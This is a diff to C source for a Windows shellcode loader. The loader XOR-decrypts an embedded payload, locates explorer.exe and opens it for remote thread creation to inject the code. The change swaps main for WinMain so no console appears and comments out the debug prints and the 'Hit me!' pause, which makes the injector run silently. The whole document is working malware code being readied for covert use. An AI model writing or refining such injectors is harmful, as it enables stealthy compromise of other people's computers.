@@ -71,7 +71,8 @@ int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {
     return -1;
 }
 
-int main(void) {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+    LPSTR lpCmdLine, int nCmdShow) {
     void * exec_mem;
     BOOL rv;
     HANDLE th;
@@ -93,8 +94,8 @@ int main(void) {
     
     // Allocate some memory buffer for payload
     exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
-    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+    //printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
+    //printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
 
     // Copy payload to new memory buffer
     RtlMoveMemory(exec_mem, payload, payload_len);
@@ -102,14 +103,14 @@ int main(void) {
     // Decrypt (DeXOR) the payload
     XOR((char*)exec_mem, payload_len, key, sizeof(key));
 
-    printf("\nHit me!\n");
-    getchar();
+    //printf("\nHit me!\n");
+    //getchar();
 
     // Inject payload into `notepad.exe` process.
     pid = FindTarget("explorer.exe");
 
     if (pid) {
-        printf("explorer.exe PID = %d\n", pid);
+        //printf("explorer.exe PID = %d\n", pid);
 
         // Try to open target process
         hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
